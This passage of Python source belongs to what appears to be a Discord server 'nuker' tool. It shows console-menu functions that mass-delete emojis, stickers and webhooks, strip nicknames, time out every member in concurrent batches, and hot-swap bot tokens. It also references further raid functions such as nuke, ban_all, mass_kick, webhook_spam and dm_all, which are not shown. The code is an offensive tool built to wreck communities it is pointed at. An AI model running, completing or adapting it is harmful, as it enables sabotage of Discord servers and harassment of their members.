            print(Colorate.Horizontal(Colors.yellow_to_green, "[+] NO MEMBERS WITH NICKNAMES FOUND."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(members_with_nick)} MEMBERS WITH NICKNAMES"))

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"REMOVE NICKNAME FROM {len(members_with_nick)} MEMBERS? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] REMOVING NICKNAMES..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 40))
        
        removed = 0
        failed = 0
        start_time = time.time()
        
        # HYPER BATCH - 30 members ek saath
        batch_size = 30
        total_members = len(members_with_nick)
        
        for i in range(0, total_members, batch_size):
            batch = members_with_nick[i:i+batch_size]
            tasks = []
            
            for member in batch:
                tasks.append(unnick_task(member))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, result in enumerate(results):
                member = batch[j]
                if isinstance(result, Exception):
                    failed += 1
                    print(Colorate.Horizontal(Colors.red_to_blue, f"❌ {member.name} unnick failed"))
                else:
                    removed += 1
                    print(Colorate.Horizontal(Colors.yellow_to_green, f" {member.name} unnick -> {member.name}"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MANAGE NICKNAMES' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

async def unnick_task(member):
    """Helper function for removing nickname from a single member"""
    await member.edit(nick=None)
    return True

# ============================================ SWITCH BOT ============================================
async def switch_bot():
    """Switch to another bot token - NO RESTART NEEDED"""
    global bot_token, server_id, bot
    
    print(Colorate.Horizontal(Colors.yellow, "=" * 60))
    print(Colorate.Horizontal(Colors.yellow_to_green, "[+] SWITCH BOT"))
    print(Colorate.Horizontal(Colors.yellow, "=" * 60))
    
    # Show current bot info
    try:
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] CURRENT BOT: {bot.user.name}#{bot.user.discriminator}"))
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] CURRENT SERVER: {server_id}"))
    except:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] CURRENT BOT INFO NOT AVAILABLE"))
    
    print(Colorate.Horizontal(Colors.yellow, "-" * 60))
    
    # Get new bot token
    new_token = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "🔐 ENTER NEW BOT TOKEN ~ "))
    
    if not new_token or len(new_token) < 50:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID TOKEN!"))
        return
    
    # Get new server ID (optional - press enter to keep same)
    new_server_id = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ENTER NEW GUILD ID (OR PRESS ENTER TO KEEP SAME) ~ "))
    
    if not new_server_id:
        new_server_id = server_id
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] KEEPING SAME SERVER ID"))
    
    confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"SWITCH TO NEW BOT? Y/N ~ "))
    if confirm.lower() != 'y':
        print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
        return
    
    print(Colorate.Horizontal(Colors.yellow, "-" * 60))
    print(Colorate.Horizontal(Colors.yellow_to_green, "[+] SWITCHING BOT..."))
    
    try:
        # Close current bot properly
        await bot.close()
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] OLD BOT DISCONNECTED"))
        
        # Update global variables
        bot_token = new_token
        server_id = new_server_id
        
        # Create new bot instance - NO message_content intent
        intents = discord.Intents.all()
        intents.guilds = True
        
        new_bot = commands.Bot(command_prefix=".", intents=intents)
        
        # Copy all global functions to new bot
        @new_bot.event
        async def on_ready():
            cc()
            viper()
            print(Colorate.Horizontal(Colors.green_to_blue, f"[+] ✅ NEW BOT CONNECTED: {new_bot.user.name}#{new_bot.user.discriminator}"))
            print(Colorate.Horizontal(Colors.green_to_blue, f"[+] ✅ BOT ID: {new_bot.user.id}"))
            
            new_guild = new_bot.get_guild(int(server_id))
            if new_guild:
                print(Colorate.Horizontal(Colors.green_to_blue, f"[+] ✅ SERVER FOUND: {new_guild.name} ({server_id})"))
                print(Colorate.Horizontal(Colors.green_to_blue, f"[+] MEMBERS: {len(new_guild.members)}"))
            else:
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] BOT NOT IN SERVER: {server_id}"))
                print(Colorate.Horizontal(Colors.yellow, "[!] MAKE SURE BOT IS IN THAT SERVER"))
            
            print(Colorate.Horizontal(Colors.yellow, "=" * 60))
            print(Colorate.Horizontal(Colors.green_to_blue, "[+] ✅ SWITCH BOT COMPLETE!"))
            print(Colorate.Horizontal(Colors.green_to_blue, "[+] ALL FEATURES ARE NOW USING NEW BOT"))
            print(Colorate.Horizontal(Colors.yellow, "=" * 60))
            
            global bot
            bot = new_bot
            await show_menu()
        
        # Copy all functions from old bot to new bot
        for func in dir(bot):
            if callable(getattr(bot, func)) and not func.startswith("_"):
                try:
                    setattr(new_bot, func, getattr(bot, func))
                except:
                    pass
        
        # Copy all global functions
        new_bot.nuke = nuke
        new_bot.webhook_spam = webhook_spam
        new_bot.create_roles = create_roles
        new_bot.delete_roles = delete_roles
        new_bot.ban_all = ban_all
        new_bot.get_admin = get_admin
        new_bot.dm_all = dm_all
        new_bot.create_channels = create_channels
        new_bot.delete_channels = delete_channels
        new_bot.change_server = change_server
        new_bot.msg_spam_only = msg_spam_only
        new_bot.prune_members = prune_members
        new_bot.unban_all = unban_all
        new_bot.lock_all_channels = lock_all_channels
        new_bot.unlock_all_channels = unlock_all_channels
        new_bot.shift_server = shift_server
        new_bot.mass_kick = mass_kick
        new_bot.mass_dm_all = mass_dm_all
        new_bot.rename_channels = rename_channels
        new_bot.nick_change_all = nick_change_all
        new_bot.unnick_all = unnick_all
        new_bot.switch_bot = switch_bot
        new_bot.change_server_logo = change_server_logo
        new_bot.delete_all_emojis = delete_all_emojis
        new_bot.delete_all_stickers = delete_all_stickers
        new_bot.timeout_all_members = timeout_all_members
        new_bot.untimeout_all_members = untimeout_all_members
        new_bot.delete_all_webhooks = delete_all_webhooks
        new_bot.create_mass_threads = create_mass_threads
        new_bot.show_menu = show_menu
        new_bot.viper = viper
        new_bot.cc = cc
        
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] CONNECTING NEW BOT..."))
        await new_bot.start(new_token)
        
    except discord.LoginFailure:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID TOKEN! LOGIN FAILED!"))
        print(Colorate.Horizontal(Colors.yellow, "[!] TRY AGAIN WITH CORRECT TOKEN"))
        await show_menu()
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))
        print(Colorate.Horizontal(Colors.yellow, "[!] TRY RESTARTING THE TOOL"))
        await show_menu()

# ============================================ CHANGE SERVER LOGO ============================================
async def change_server_logo(server_id):
    """Change server logo from .png or .jpg file in folder"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions
        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.manage_guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'MANAGE SERVER' PERMISSION!"))
            return

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] CHANGE SERVER LOGO"))
        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        
        # Show current server info
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] SERVER: {guild.name}"))
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] CURRENT ICON: {'Yes' if guild.icon else 'No Icon'}"))
        print(Colorate.Horizontal(Colors.yellow, "-" * 60))

        # Get list of image files in current directory
        image_files = []
        for file in os.listdir('.'):
            if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp')):
                image_files.append(file)
        
        if not image_files:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] NO IMAGE FILES FOUND IN FOLDER!"))
            print(Colorate.Horizontal(Colors.yellow_to_green, "[!] PLACE .png OR .jpg FILE IN THE SAME FOLDER"))
            return

        # Show available images
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] AVAILABLE IMAGES:"))
        for i, img in enumerate(image_files, 1):
            print(Colorate.Horizontal(Colors.yellow_to_green, f"    {i}. {img}"))
        print(Colorate.Horizontal(Colors.yellow, "-" * 60))

        # Let user choose image
        choice = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ENTER IMAGE NUMBER OR FULL FILENAME ~ "))
        
        selected_file = None
        
        # Check if user entered number
        try:
            num = int(choice)
            if 1 <= num <= len(image_files):
                selected_file = image_files[num - 1]
        except ValueError:
            # User entered filename directly
            if choice in image_files:
                selected_file = choice
        
        if not selected_file:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SELECTION!"))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] SELECTED: {selected_file}"))

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"CHANGE SERVER LOGO TO '{selected_file}'? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] UPLOADING NEW LOGO..."))
        start_time = time.time()

        try:
            # Read image file
            with open(selected_file, 'rb') as f:
                image_data = f.read()
            
            # Check file size (Discord limit: 5MB)
            if len(image_data) > 5 * 1024 * 1024:
                print(Colorate.Horizontal(Colors.red_to_blue, "[-] FILE TOO LARGE! MAX 5MB ALLOWED."))
                return
            
            # Update server icon
            await guild.edit(icon=image_data)
            
            end_time = time.time()
            print(Colorate.Horizontal(Colors.green_to_blue, f"[+] ✅ SERVER LOGO CHANGED SUCCESSFULLY!"))
            print(Colorate.Horizontal(Colors.green_to_blue, f"[+] NEW LOGO: {selected_file}"))
            print(Colorate.Horizontal(Colors.green_to_blue, f"[+] TIME: {end_time - start_time:.2f}s"))
            
        except discord.HTTPException as e:
            if e.status == 413:
                print(Colorate.Horizontal(Colors.red_to_blue, "[-] FILE TOO LARGE! MAX 5MB ALLOWED."))
            else:
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] HTTP ERROR: {e}"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))

    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MANAGE SERVER' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

# ============================================ DELETE ALL EMOJIS ============================================
async def delete_all_emojis(server_id):
    """Delete ALL custom emojis from the server"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions
        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.manage_emojis:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'MANAGE EMOJIS' PERMISSION!"))
            return

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] DELETE ALL EMOJIS"))
        print(Colorate.Horizontal(Colors.yellow, "=" * 60))

        # Get all custom emojis
        emojis = guild.emojis
        
        if not emojis:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[+] NO CUSTOM EMOJIS FOUND."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(emojis)} CUSTOM EMOJIS"))

        # Show some emojis
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] EMOJIS:"))
        for i, emoji in enumerate(emojis[:10], 1):
            print(Colorate.Horizontal(Colors.yellow_to_green, f"    {i}. {emoji.name}"))
        if len(emojis) > 10:
            print(Colorate.Horizontal(Colors.yellow_to_green, f"    ... and {len(emojis) - 10} more"))

        print(Colorate.Horizontal(Colors.yellow, "-" * 60))

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"DELETE ALL {len(emojis)} EMOJIS? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        # Second confirmation if more than 50 emojis
        if len(emojis) > 50:
            confirm2 = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"⚠️ {len(emojis)} EMOJIS WILL BE DELETED. CONTINUE? Y/N ~ "))
            if confirm2.lower() != 'y':
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
                return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] DELETING EMOJIS..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 50))
        
        deleted = 0
        failed = 0
        start_time = time.time()
        
        for emoji in emojis:
            try:
                await emoji.delete()
                deleted += 1
                print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] DELETED: {emoji.name}"))
            except discord.Forbidden:
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {emoji.name} (PERMISSION DENIED)"))
            except Exception as e:
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {emoji.name} ({e})"))
            
            # Rate limit ke liye thoda wait
            await asyncio.sleep(0.2)
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MANAGE EMOJIS' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}")) 

# ============================================ DELETE ALL STICKERS ============================================
async def delete_all_stickers(server_id):
    """Delete ALL custom stickers from the server"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions
        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.manage_emojis_and_stickers:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'MANAGE EMOJIS AND STICKERS' PERMISSION!"))
            return

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] DELETE ALL STICKERS"))
        print(Colorate.Horizontal(Colors.yellow, "=" * 60))

        # Get all custom stickers
        stickers = guild.stickers
        
        if not stickers:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[+] NO CUSTOM STICKERS FOUND."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(stickers)} CUSTOM STICKERS"))

        # Show some stickers
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] STICKERS:"))
        for i, sticker in enumerate(stickers[:10], 1):
            print(Colorate.Horizontal(Colors.yellow_to_green, f"    {i}. {sticker.name}"))
        if len(stickers) > 10:
            print(Colorate.Horizontal(Colors.yellow_to_green, f"    ... and {len(stickers) - 10} more"))

        print(Colorate.Horizontal(Colors.yellow, "-" * 60))

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"DELETE ALL {len(stickers)} STICKERS? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        # Second confirmation if more than 50 stickers
        if len(stickers) > 50:
            confirm2 = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"⚠️ {len(stickers)} STICKERS WILL BE DELETED. CONTINUE? Y/N ~ "))
            if confirm2.lower() != 'y':
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
                return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] DELETING STICKERS..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 50))
        
        deleted = 0
        failed = 0
        start_time = time.time()
        
        for sticker in stickers:
            try:
                await sticker.delete()
                deleted += 1
                print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] DELETED: {sticker.name}"))
            except discord.Forbidden:
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {sticker.name} (PERMISSION DENIED)"))
            except Exception as e:
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {sticker.name} ({e})"))
            
            # Rate limit ke liye thoda wait
            await asyncio.sleep(0.2)
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MANAGE EMOJIS AND STICKERS' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))    

# ============================================ TIMEOUT ALL MEMBERS ============================================
async def timeout_all_members(server_id):
    """Timeout ALL members in the server"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions - FIXED: try/except for moderate_members
        bot_member = guild.get_member(bot.user.id)
        try:
            if not bot_member.guild_permissions.moderate_members:
                print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MODERATE MEMBERS' PERMISSION!"))
                return
        except AttributeError:
            # Old discord.py version - check if timeout feature is available
            try:
                # Try to timeout a test member (bot itself) to check permission
                await bot_member.timeout(discord.utils.utcnow() + datetime.timedelta(seconds=10))
                await bot_member.timeout(None)  # Remove timeout immediately
            except:
                print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MODERATE MEMBERS' PERMISSION!"))
                return

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] TIMEOUT ALL MEMBERS"))
        print(Colorate.Horizontal(Colors.yellow, "=" * 60))

        # Get all members (excluding bots and self)
        members = [m for m in guild.members if not m.bot and m.id != bot.user.id]
        
        if not members:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] NO MEMBERS TO TIMEOUT."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(members)} MEMBERS"))

        # Get timeout duration
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] TIMEOUT DURATION OPTIONS:"))
        print(Colorate.Horizontal(Colors.yellow_to_green, "    1. 1 MINUTE"))
        print(Colorate.Horizontal(Colors.yellow_to_green, "    2. 5 MINUTES"))
        print(Colorate.Horizontal(Colors.yellow_to_green, "    3. 10 MINUTES"))
        print(Colorate.Horizontal(Colors.yellow_to_green, "    4. 30 MINUTES"))
        print(Colorate.Horizontal(Colors.yellow_to_green, "    5. 1 HOUR"))
        print(Colorate.Horizontal(Colors.yellow_to_green, "    6. 6 HOURS"))
        print(Colorate.Horizontal(Colors.yellow_to_green, "    7. 12 HOURS"))
        print(Colorate.Horizontal(Colors.yellow_to_green, "    8. 24 HOURS"))
        print(Colorate.Horizontal(Colors.yellow_to_green, "    9. CUSTOM (IN SECONDS)"))

        duration_choice = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "SELECT TIMEOUT DURATION (1-9) ~ "))

        # Duration mapping
        duration_map = {
            '1': 60,
            '2': 300,
            '3': 600,
            '4': 1800,
            '5': 3600,
            '6': 21600,
            '7': 43200,
            '8': 86400
        }

        if duration_choice == '9':
            custom_seconds = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ENTER TIMEOUT IN SECONDS ~ "))
            try:
                timeout_seconds = int(custom_seconds)
                if timeout_seconds < 1:
                    print(Colorate.Horizontal(Colors.red_to_blue, "[-] MUST BE AT LEAST 1 SECOND."))
                    return
                if timeout_seconds > 2419200:  # 28 days max
                    print(Colorate.Horizontal(Colors.red_to_blue, "[-] MAX 28 DAYS (2419200 SECONDS)."))
                    return
            except ValueError:
                print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID NUMBER."))
                return
        elif duration_choice in duration_map:
            timeout_seconds = duration_map[duration_choice]
        else:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID CHOICE."))
            return

        # Convert to readable format
        if timeout_seconds >= 86400:
            time_str = f"{timeout_seconds // 86400} days"
        elif timeout_seconds >= 3600:
            time_str = f"{timeout_seconds // 3600} hours"
        elif timeout_seconds >= 60:
            time_str = f"{timeout_seconds // 60} minutes"
        else:
            time_str = f"{timeout_seconds} seconds"

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"TIMEOUT {len(members)} MEMBERS FOR {time_str}? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        # Second confirmation if more than 50 members
        if len(members) > 50:
            confirm2 = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"⚠️ {len(members)} MEMBERS WILL BE TIMED OUT. CONTINUE? Y/N ~ "))
            if confirm2.lower() != 'y':
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
                return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] TIMEOUTING {len(members)} MEMBERS FOR {time_str}..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 40))
        
        timed_out = 0
        failed = 0
        start_time = time.time()
        
        # Create timeout until time
        until = discord.utils.utcnow() + datetime.timedelta(seconds=timeout_seconds)
        
        # BATCH PROCESSING - 10 members ek saath
        batch_size = 10
        total_members = len(members)
        
        for i in range(0, total_members, batch_size):
            batch = members[i:i+batch_size]
            tasks = []
            
            for member in batch:
                tasks.append(timeout_member_task(member, until))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, result in enumerate(results):
                member = batch[j]
                if isinstance(result, Exception):
                    failed += 1
                    print(Colorate.Horizontal(Colors.red_to_blue, f"❌ {member.name} timeout failed"))
                else:
                    timed_out += 1
                    print(Colorate.Horizontal(Colors.yellow_to_green, f"⏰ {member.name} timed out ({time_str})"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

async def timeout_member_task(member, until):
    """Helper function for timing out a single member"""
    await member.timeout(until, reason="MASS TIMEOUT BY REX")
    return True

# ============================================ UNTIMEOUT ALL ============================================
async def untimeout_all_members(server_id):
    """Remove timeout from ALL members in the server"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions
        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.moderate_members:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'MODERATE MEMBERS' PERMISSION!"))
            return

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] UNTIMEOUT ALL MEMBERS"))
        print(Colorate.Horizontal(Colors.yellow, "=" * 60))

        # Get all members who are timed out (excluding bots and self)
        timed_out_members = [m for m in guild.members if m.is_timed_out() and not m.bot and m.id != bot.user.id]
        
        if not timed_out_members:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[+] NO MEMBERS ARE CURRENTLY TIMED OUT."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(timed_out_members)} MEMBERS IN TIMEOUT"))

        # Show some timed out members
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] TIMED OUT MEMBERS:"))
        for i, member in enumerate(timed_out_members[:10], 1):
            time_left = member.timed_out_until - discord.utils.utcnow() if member.timed_out_until else None
            if time_left:
                minutes = int(time_left.total_seconds() // 60)
                seconds = int(time_left.total_seconds() % 60)
                print(Colorate.Horizontal(Colors.yellow_to_green, f"    {i}. {member.name} - {minutes}m {seconds}s left"))
            else:
                print(Colorate.Horizontal(Colors.yellow_to_green, f"    {i}. {member.name}"))
        if len(timed_out_members) > 10:
            print(Colorate.Horizontal(Colors.yellow_to_green, f"    ... and {len(timed_out_members) - 10} more"))

        print(Colorate.Horizontal(Colors.yellow, "-" * 60))

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"REMOVE TIMEOUT FROM {len(timed_out_members)} MEMBERS? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        # Second confirmation if more than 50 members
        if len(timed_out_members) > 50:
            confirm2 = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"⚠️ {len(timed_out_members)} MEMBERS WILL BE UNTIMED OUT. CONTINUE? Y/N ~ "))
            if confirm2.lower() != 'y':
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
                return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] REMOVING TIMEOUTS..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 50))
        
        removed = 0
        failed = 0
        start_time = time.time()
        
        for member in timed_out_members:
            try:
                # None means remove timeout
                await member.timeout(None, reason="MASS UNTIMEOUT BY REX")
                removed += 1
                print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] UNTIMED OUT: {member.name}#{member.discriminator} ({member.id})"))
            except discord.Forbidden:
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {member.name} (PERMISSION DENIED)"))
            except Exception as e:
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {member.name} ({e})"))
            
            # Rate limit ke liye thoda wait
            await asyncio.sleep(0.2)
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MODERATE MEMBERS' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))     

# ============================================ DELETE ALL WEBHOOKS ============================================
async def delete_all_webhooks(server_id):
    """Delete ALL webhooks - HYPER FAST (20 webhooks/sec)"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions
        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.manage_webhooks:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'MANAGE WEBHOOKS' PERMISSION!"))
            return

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] DELETE ALL WEBHOOKS"))
        print(Colorate.Horizontal(Colors.yellow, "=" * 60))

        # Get all webhooks from all channels
        webhooks = await guild.webhooks()
        
        if not webhooks:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[+] NO WEBHOOKS FOUND."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(webhooks)} WEBHOOKS"))

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"DELETE ALL {len(webhooks)} WEBHOOKS? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        if len(webhooks) > 50:
            confirm2 = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"⚠️ {len(webhooks)} WEBHOOKS WILL BE DELETED. CONTINUE? Y/N ~ "))
            if confirm2.lower() != 'y':
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
                return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] DELETING WEBHOOKS..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 40))
        
        deleted = 0
        failed = 0
        start_time = time.time()
        
        # BATCH PROCESSING - 20 webhooks ek saath
        batch_size = 20
        total_webhooks = len(webhooks)
        
        for i in range(0, total_webhooks, batch_size):
            batch = webhooks[i:i+batch_size]
            tasks = []
            
            for webhook in batch:
                tasks.append(delete_webhook_task(webhook))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, result in enumerate(results):
                webhook = batch[j]
                if isinstance(result, Exception):
                    failed += 1
                    print(Colorate.Horizontal(Colors.red_to_blue, f"❌ {webhook.name} failed"))
                else:
                    deleted += 1
                    print(Colorate.Horizontal(Colors.yellow_to_green, f"🗑️ {webhook.name} deleted"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MANAGE WEBHOOKS' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

async def delete_webhook_task(webhook):
    """Helper function for deleting a single webhook"""
    await webhook.delete()
    return True

# ============================================ CREATE MASS THREADS ============================================
async def create_mass_threads(server_id):
